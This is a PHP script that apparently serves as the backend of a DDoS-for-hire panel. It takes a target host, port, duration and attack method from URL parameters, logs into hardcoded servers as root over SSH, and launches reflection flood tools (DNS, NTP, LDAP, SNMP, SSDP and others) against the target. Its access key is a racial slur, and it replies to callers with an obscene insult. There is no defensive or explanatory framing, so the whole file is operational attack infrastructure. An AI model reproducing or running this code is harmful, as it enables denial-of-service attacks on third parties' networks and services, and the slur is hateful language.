<?php
if (!function_exists('ssh2_connect'))
{
        die("Install ssh2 module.\n");
}
if ($_GET['key'] != "nigger"){
die("Go Fuck Yourself.");
}
if (isset($_GET['host'], $_GET['port'], $_GET['time'], $_GET['method'])) {
        $SERVERS = array(
                "1.1.1.1"       =>      array("root", "password")
                );
        class ssh2 {
                var $connection;
                function __construct($host, $user, $pass) {
                        if (!$this->connection = ssh2_connect($host, 22))
                                throw new Exception("Error connecting to server");
                        if (!ssh2_auth_password($this->connection, $user, $pass))
                                throw new Exception("Error with login credentials");
                }
 
                function exec($cmd) {
                        if (!ssh2_exec($this->connection, $cmd))
                                throw new Exception("Error executing command: $cmd");
 
                        ssh2_exec($this->connection, 'exit');
                        unset($this->connection);
                }
        }
        $port = (int)$_GET['port'] > 0 && (int)$_GET['port'] < 65536 ? $_GET['port'] : 80;
        $port = preg_replace('/\D/', '', $port);
        $ip = preg_match('/^[a-zA-Z0-9\.-_]+$/', $_GET['host']) ? $_GET['host'] : die();
        $time = (int)$_GET['time'] > 0 && (int)$_GET['time'] < (60*60) ? (int)$_GET['time'] : 30;
        $time = preg_replace('/\D/', '', $time);
        $domain = $_GET['host'];
        if(!filter_var($domain, FILTER_VALIDATE_URL) && !filter_var($domain, FILTER_VALIDATE_IP))
        {
            die("Invalid Domain");
        }
        $smIP = str_replace(".", "", $ip);
        $smDomain = str_replace(".", "", $domain);
        $smDomain = str_replace("http://", "", $smDomain);
        if($_GET['method'] == "db2") { $command = "screen -dmS {$smIP} ./db2 {$ip} {$port} db2.txt 10 -1 {$time}"; }
        elseif($_GET['method'] == "dns") { $command = "screen -dmS {$smIP} ./dns {$ip} {$port} dns.txt 10 -1 {$time}"; }
        elseif($_GET['method'] == "ldap") { $command = "screen -dmS {$smIP} ./ldap {$ip} {$port} ldap.txt 10 -1 {$time}"; }
        elseif($_GET['method'] == "mdns") { $command = "screen -dmS {$smIP} ./mdns {$ip} {$port} mdns.txt 10 -1 {$time}"; }
        elseif($_GET['method'] == "meme") { $command = "screen -dmS {$smIP} ./meme {$ip} {$port} meme.txt 10 -1 {$time}"; }
        elseif($_GET['method'] == "netbios") { $command = "screen -dmS {$smIP} ./netbios {$ip} {$port} netbios.txt 10 -1 {$time}"; }
		elseif($_GET['method'] == "ntp") { $command = "screen -dmS {$smIP} ./ntp {$ip} {$port} ntp.txt 10 -1 {$time}"; }
        elseif($_GET['method'] == "snmp") { $command = "screen -dmS {$smIP} ./snmp {$ip} {$port} snmp.txt 10 -1 {$time}"; }
        elseif($_GET['method'] == "ssdp") { $command = "screen -dmS {$smIP} ./ssdp {$ip} {$port} ssdp.txt 10 -1 {$time}"; }
        elseif($_GET['method'] == "ts3") { $command = "screen -dmS {$smIP} ./ts3 {$ip} {$port} ts3.txt 10 -1 {$time}"; }
		elseif($_GET['method'] == "stop") { $command = "screen -X -s {$smIP} quit"; }
        else die();
        foreach ($SERVERS as $server=>$credentials) {
                $disposable = new ssh2($server, $credentials[0], $credentials[1]);
                $disposable->exec($command);
}
}
?>